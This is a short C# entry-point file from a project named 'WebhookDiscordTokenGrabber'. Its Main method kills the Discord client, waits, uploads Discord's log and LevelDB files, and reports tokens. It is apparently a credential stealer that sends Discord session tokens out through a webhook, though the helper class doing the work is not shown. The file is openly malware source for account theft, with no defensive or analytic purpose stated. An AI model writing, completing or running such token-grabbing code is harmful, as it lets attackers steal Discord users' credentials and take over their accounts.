using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace WebhookDiscordTokenGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            Grabbing.KillDiscord();
            System.Threading.Thread.Sleep(7000);
            Grabbing.UploadLogFile();
            Grabbing.UploadldbFile();
            Grabbing.ReportTokens();
        }
    }
}
